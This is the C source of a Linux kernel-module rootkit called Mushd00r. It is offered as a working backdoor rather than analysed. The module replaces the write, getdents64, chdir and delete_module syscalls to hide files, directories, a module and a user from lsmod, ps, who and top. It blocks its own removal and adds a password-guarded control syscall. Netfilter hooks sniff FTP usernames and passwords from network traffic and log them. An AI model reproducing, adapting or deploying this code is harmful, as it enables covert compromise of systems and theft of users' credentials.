/* ==================================
	Mushd00r v0.1b
 	bugs to hazard@trava.ffk.hr
 ==================================*/

#define MODULE
#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <sys/syscall.h>
#include <asm/fcntl.h>
#include <asm/errno.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/uaccess.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>

MODULE_LICENSE("GPL");

extern void* sys_call_table[];

#define NG_SYSCALL 250

/* DEF_syscall */
int (*pravi_write) (u_int fd,u_char *buf,u_int count);
int (*pravi_getdents64) (uint , struct dirent64 *, uint);
int (*pravi_create_module) (char*, unsigned long);
int (*pravi_delete_module) (char *);
int (*pravi_stat) (const char *, struct stat64*);
int (*pravi_chdir) (const char *);

/* START glob_var */

/* ===prog */
int lock_dmod=0;
int lock_dir=0;
char kunl_dir[10]="unlockdir";
char kloc_dir[10]="lockdir";
char passwd[10]="passwd";
char skup_d[10][10];
char modname[]="mushd00r";
char usrname[]="";
char ip_addr[]="127.0.0.1";
char host_name[]="";

int z=0;
int i=0;
int prvi_put=1;
/* prog=== */

/* ===ftp_destination */
char *ftp_dst_usern = NULL;
char *ftp_dst_pass = NULL;
int ftp_dst_up=0;
unsigned int ftp_dst_ip=0;
unsigned int ftp_dst_port=0;
/* ftp_destination=== */

/* ===ftp_incoming */
char *ftp_inc_usern = NULL;
char *ftp_inc_pass = NULL;
int ftp_inc_up=0;
unsigned int ftp_inc_ip=0;
unsigned int ftp_inc_port=0;
/* ftp_incoming=== */

struct nf_hook_ops desthook;
struct nf_hook_ops  inchook;

/* END glob_var  */

/* BEGIN functions */
int ffree_dirs()
{
	for (i=0;i<10;i++)
	{
		if(strlen(skup_d[i])==0)
		{
			if(i==0)
				prvi_put=1;
			return i;
		}
	}
	return 0;
}

int find_dir(char *dir)
{
	for(i=0;i<10;i++)
	{
		if(strcmp((char *)skup_d[i], dir) == 0)
			return i;
	}
	return 11;
}

int add_dir(dod_str)
{
	int ret=0;
	if(prvi_put==1)
	{
		prvi_put=0;
		strcpy(skup_d[0], (char *)dod_str);
		return 0;
	}

	ret=ffree_dirs();
	if (ret > 0)
	{
		strcpy(skup_d[ret], (char *)dod_str);
		return 0;
	}
	else return 5;
}

int rm_dir(dod_str)
{
	int ret=0,i;
	ret=find_dir((char *)dod_str);
	if (ret!=11 )
	{
		for (i=0; i<strlen(skup_d[ret]);i++)
			skup_d[ret][i]='\0';
		return 0;
	}
	else return 6;
}
/* END functions */

/* START netfilter_hook */
void log_ftp_dst(struct sk_buff *skb)
{

	struct tcphdr *tcp;
	char *data_p;
	int len = 0, i = 0;

	tcp = (struct tcphdr *)(skb->data + (skb->nh.iph->ihl * 4));
	data_p = (char *)((int)tcp + (int)(tcp->doff * 4));

	if (strncmp(data_p, "USER ", 5) == 0)
	{
		data_p += 5;
		if (ftp_dst_usern)  return;
		while (*(data_p + i) != '\r' && *(data_p + i) != '\n' && *(data_p + i) != '\0' && i < 15)
		{
			len++;
			i++;
		}

		if ((ftp_dst_usern = kmalloc(len + 2, GFP_KERNEL)) == NULL)
			return;
		memset(ftp_dst_usern, 0x00, len + 2);
		memcpy(ftp_dst_usern, data_p, len);
		*(ftp_dst_usern + len) = '\0';
	}
	else if (strncmp(data_p, "PASS ", 5) == 0)
	{
		data_p += 5;

		if (ftp_dst_usern == NULL)
			return;
		if (ftp_dst_pass)
			return;

		while (*(data_p + i) != '\r' && *(data_p + i) != '\n' && *(data_p + i) != '\0' && i < 15)
		{
			len++;
			i++;
		}

		if ((ftp_dst_pass = kmalloc(len + 2, GFP_KERNEL)) == NULL)
			return;
		memset(ftp_dst_pass, 0x00, len + 2);
		memcpy(ftp_dst_pass, data_p, len);
		*(ftp_dst_pass + len) = '\0';
	}
	else if (strncmp(data_p, "QUIT", 4) == 0)
	{
		if (ftp_dst_up)
			return;
		if (ftp_dst_usern && !ftp_dst_pass)
		{
			kfree(ftp_dst_usern);
			ftp_dst_usern = NULL;
			ftp_dst_port = ftp_dst_ip = 0;
			ftp_dst_up = 0;
			return;
		}
	}
	else
		return;

	if (!ftp_dst_ip)
		ftp_dst_ip = skb->nh.iph->daddr;

	if (!ftp_dst_port)
		ftp_dst_port = tcp->source;

	if (ftp_dst_usern && ftp_dst_pass)
		ftp_dst_up++;

	if (ftp_dst_up)
	{
		printk("<1> Have dst_pass pair!  U: %s   P: %s\n", ftp_dst_usern, ftp_dst_pass);

/* uncoment if want to test your kernel strength ;-) (needs some fixes)
		struct file *fp;
		fp = filp_open("/tmp/logdstpas", O_WRONLY | O_CREAT , 0);
		if (IS_ERR(fp))
			printk("<1> Failed opening file! Error: %ld\n", -PTR_ERR(fp));

		mm_segment_t old_fs;
		old_fs =  get_fs();
		set_fs(get_ds());

		_write(fp, ftp_dst_usern, strlen(ftp_dst_usern));
		_write(fp, ftp_dst_pass, strlen(ftp_dst_pass));

		set_fs(old_fs);
		filp_close(fp, NULL);
*/

		kfree(ftp_dst_usern);
		kfree(ftp_dst_pass);
		ftp_dst_usern = ftp_dst_pass = NULL;
		ftp_dst_up = 0;
		ftp_dst_port = ftp_dst_ip = 0;
	}
}

unsigned int outgoing( unsigned int hooknum, struct sk_buff **skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
	struct sk_buff *sb = *skb;

	if (sb->nh.iph->protocol != IPPROTO_TCP)
		return NF_ACCEPT;

	if (ftp_dst_up==0)
		log_ftp_dst(sb);

	return NF_ACCEPT;
}

void log_ftp_inc(struct sk_buff *sk)
{
	struct tcphdr *tcp;
	char *data_p;
	int len = 0, i = 0;

	tcp = (struct tcphdr *)(sk->data + (sk->nh.iph->ihl * 4));
	data_p = (char *)((int)tcp + (int)(tcp->doff * 4));

	if (strncmp(data_p, "USER ", 5) == 0)
	{
		data_p += 5;
		if (ftp_inc_usern)  return;
		while (*(data_p + i) != '\r' && *(data_p + i) != '\n' && *(data_p + i) != '\0' && i < 15)
		{
			len++;
			i++;
		}

		if ((ftp_inc_usern = kmalloc(len + 2, GFP_KERNEL)) == NULL)
			return;
		memset(ftp_inc_usern, 0x00, len + 2);
		memcpy(ftp_inc_usern, data_p, len);
		*(ftp_inc_usern + len) = '\0';
	}
	else if (strncmp(data_p, "PASS ", 5) == 0)
	{
		data_p += 5;

		if (ftp_inc_usern == NULL)
			return;
		if (ftp_inc_pass)
			return;

		while (*(data_p + i) != '\r' && *(data_p + i) != '\n' && *(data_p + i) != '\0' && i < 15)
		{
			len++;
			i++;
		}

		if ((ftp_inc_pass = kmalloc(len + 2, GFP_KERNEL)) == NULL)
			return;
		memset(ftp_inc_pass, 0x00, len + 2);
		memcpy(ftp_inc_pass, data_p, len);
		*(ftp_inc_pass + len) = '\0';
	}
	else if (strncmp(data_p, "QUIT", 4) == 0)
	{

		if (ftp_inc_up)
			return;
		if (ftp_inc_usern && !ftp_inc_pass)
		{
			kfree(ftp_inc_usern);
			ftp_inc_usern = NULL;
			ftp_inc_port = ftp_inc_ip = 0;
			ftp_inc_up = 0;
			return;
		}
	}
	else
		return;

	if (!ftp_inc_ip)
		ftp_inc_ip = sk->nh.iph->daddr;

	if (!ftp_inc_port)
		ftp_inc_port = tcp->source;

	if (ftp_inc_usern && ftp_inc_pass)
		ftp_inc_up++;

	if (ftp_inc_up)
	{
		printk("<1> Have incoming pair!  U: %s   P: %s\n", ftp_inc_usern, ftp_inc_pass);

/*
		struct file *fp;
		fp = filp_open("/tmp/logincpas", O_WRONLY | O_CREAT , 0);
		if (IS_ERR(fp))
			printk("<1>Failed opening file! Error: %ld\n", -PTR_ERR(fp));

		mm_segment_t old_fs;
		old_fs =  get_fs();
		set_fs(get_ds());

		_write(fp, ftp_inc_usern, strlen(ftp_inc_usern));
		_write(fp, ftp_inc_pass, strlen(ftp_inc_pass));

		set_fs(old_fs);
		filp_close(fp, NULL);
*/

		kfree(ftp_inc_usern);
		kfree(ftp_inc_pass);
		ftp_inc_usern = ftp_inc_pass = NULL;
		ftp_inc_up = 0;
		ftp_inc_port = ftp_inc_ip = 0;
	}
}
unsigned int incoming(unsigned int hooknum,  struct sk_buff **skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	struct sk_buff *sbb = *skb;

	if (sbb->nh.iph->protocol != IPPROTO_TCP)
		return NF_ACCEPT;

	if (!ftp_inc_up)
		log_ftp_inc(sbb);

	return NF_ACCEPT;
}
/* END netfiletr_hook */

/* START fake_sys_calls */
int fake_write(u_int fd,u_char *buf,u_int count)
{
	 int org_ret;
	char *ker_buf=(char*)kmalloc(256,GFP_KERNEL);

	copy_from_user(ker_buf,buf,255);

	if(lock_dir=1 && strstr(ker_buf,kunl_dir)!=NULL)
	{
		lock_dir=0;
	}
	else if(lock_dir=0 && strstr(ker_buf,kloc_dir)!=NULL)
	{
		lock_dir=1;
	}

	if(strlen(ip_addr)>3 && strlen(host_name)>3)
	{
		char *swap;
		if(swap=strstr(ker_buf,ip_addr))
		{
			memset(swap, 0x00, strlen(ip_addr));
			kfree(ker_buf);
			return 0;
		}
		else if(swap=strstr(ker_buf,host_name))
		{
			memset(ker_buf, 0x00,  sizeof(ker_buf) );
			kfree(ker_buf);
			return 0;
		}
	}

	if(strlen(modname)>2)
	{
		if(!(strcmp(current->comm,"lsmod")))
		{
			if(strstr(ker_buf,modname))
			{
				kfree(ker_buf);
				return -ENOENT;
			}
		}
	}

	if(strlen(usrname)>2)
	{
		if(!(strcmp(current->comm,"w")))
		{
			if(strstr(ker_buf,usrname))
			{
				kfree(ker_buf);
				return -ENOENT;
			}
		}
		else if(!(strcmp(current->comm,"who")))
		{
			if(strstr(ker_buf,usrname))
			{
				kfree(ker_buf);
				return -ENOENT;
			}
		}
		else if(!(strcmp(current->comm,"ps")))
		{
			if(strstr(ker_buf,usrname))
			{
				kfree(ker_buf);
				return -ENOENT;
			}
		}
		else if(!(strcmp(current->comm,"top")))
		{
			if(strstr(ker_buf,usrname))
			{
				kfree(ker_buf);
				return -ENOENT;
			}
		}
	}

	kfree(ker_buf);
 	org_ret=(*pravi_write)(fd,buf,count);
 	return org_ret;
}

int fake_getdents64(uint fd, struct dirent64 *dir_p, uint count)
{
	unsigned int orig_ret, n;
	int tmp, i;
	struct inode *dir_inode;
	struct dirent64 *dir_p2, *dir_p3;

	orig_ret = (*pravi_getdents64) (fd, dir_p, count);

	#ifdef __LINUX_DCACHE_H
		dir_inode = current->files->fd[fd]->f_dentry->d_inode;
	#else
		dir_inode = current->files->fd[fd]->f_inode;
	#endif

	if (orig_ret > 0)
	{
		dir_p2 = (struct dirent64 *) kmalloc(orig_ret, GFP_KERNEL);
		copy_from_user(dir_p2, dir_p, orig_ret);
		dir_p3 = dir_p2;
		tmp = orig_ret;

		while(tmp > 0)
		{
			n = dir_p3->d_reclen;
			tmp -= n;
			if(ffree_dirs()!=0)
			{
				i=0;
				while(strlen(skup_d[i])!=0 && i<10)
				{
					if (strstr((char *) &(dir_p3->d_name), (char *) &skup_d[i]) != NULL)
					{
						if (tmp != 0)
							memmove(dir_p3, (char *) dir_p3 + dir_p3->d_reclen, tmp);
						else
							dir_p3->d_off = 1024;
						orig_ret -= n;
					}
					i++;
				}
			}
			if (dir_p3->d_reclen == 0)
			{
				orig_ret -= tmp;
				tmp = 0;
			}
			if (tmp != 0)
				dir_p3 = (struct dirent64 *) ((char *) dir_p3 + dir_p3->d_reclen);
		}
		copy_to_user(dir_p, dir_p2, orig_ret);
		kfree(dir_p2);
	}
	return orig_ret;
}

int fake_delete_module(char *ime_dm)
{
	int ret;
	if (lock_dmod==1)
	{
		if(strcmp( (char *)ime_dm, (char *)modname))
			return 0;
	}

	ret=pravi_delete_module(ime_dm);
	return ret;
}

int fake_chdir(const char *path)
{
	char *usrch_path;
	int ret=0;

	usrch_path = (char *) kmalloc(255, GFP_KERNEL);
	(void) copy_from_user(usrch_path, path, 255);

	if(lock_dir==1 && strlen(skup_d[0])>2 && strstr(usrch_path, skup_d[0])!=NULL)
	{
		kfree(usrch_path);
		return -ENOENT;
	}

	kfree(usrch_path);
	ret = pravi_chdir(path);
	return ret;
}

/* new_syscall (editing options) */
int ng_syscall(unsigned int optn, char *pass, char *dod_str)
{
	if(lock_dir==1)
		return;

	if (strlen(pass)>9 || strlen(dod_str)>9 || strstr((char *)pass, (char *)passwd)==NULL)
		return 3;

	switch (optn)
	{
		case 1:
			if (add_dir(dod_str)!=0)
				return 5;
			else return 0;
			break;

		case 2:
			if(rm_dir(dod_str)!=0)
				return 6;
			else return 0;
			return 0;
			break;

		case 3:
			strcpy(passwd, (char *)dod_str);
			return 0;
			break;

		case 4:
			lock_dmod=1;
			return 0;
			break;

		case 5:
			lock_dmod=0;
			return 0;
			break;

		case 7:
			strcpy(modname, dod_str);
			return 0;
			break;

		case 8:
			strcpy(usrname, dod_str);
			return 0;
			break;

		case 9:
			strcpy(ip_addr, dod_str);
			return 0;
			break;

		case 10:
			strcpy(host_name, dod_str);
			return 0;
			break;

		case 11:
			strcpy(kunl_dir, dod_str);
			return 0;
			break;

		case 12:
			strcpy(kloc_dir, dod_str);
			return 0;
			break;

		default: return 2;
	}
}
/* END fake_syscalls */

/* INIT & EXIT */
int init_module(void)
{
	inchook.hook = incoming;
	inchook.pf = PF_INET;
	inchook.priority = NF_IP_PRI_FIRST;
	inchook.hooknum = NF_IP_PRE_ROUTING;

	desthook.hook = outgoing;
	desthook.pf = PF_INET;
	desthook.priority = NF_IP_PRI_FIRST;
	desthook.hooknum = NF_IP_POST_ROUTING;

	nf_register_hook(&desthook);
	nf_register_hook(&inchook);

	pravi_write=sys_call_table[SYS_write];
	sys_call_table[SYS_write]=fake_write;

	pravi_getdents64=sys_call_table[SYS_getdents64];
	sys_call_table[SYS_getdents64]=fake_getdents64;

	pravi_delete_module=sys_call_table[SYS_delete_module];
	sys_call_table[SYS_delete_module]=fake_delete_module;

	pravi_chdir=sys_call_table[SYS_chdir];
	sys_call_table[SYS_chdir]=fake_chdir;

	sys_call_table[NG_SYSCALL]=ng_syscall;

	return 0;
}

cleanup_module(void)
{
	nf_unregister_hook(&desthook);
	nf_unregister_hook(&inchook);

	if (ftp_dst_pass)
		kfree(ftp_dst_pass);
	if (ftp_dst_usern)
		kfree(ftp_dst_usern);

	if (ftp_inc_pass)
		kfree(ftp_inc_pass);
	if (ftp_inc_usern)
		kfree(ftp_inc_usern);

	sys_call_table[SYS_write]=pravi_write;
	sys_call_table[SYS_getdents64]=pravi_getdents64;
	sys_call_table[SYS_delete_module]=pravi_delete_module;
	sys_call_table[SYS_chdir]=pravi_chdir;
	sys_call_table[NG_SYSCALL]=0;
}
/* END ;-) */
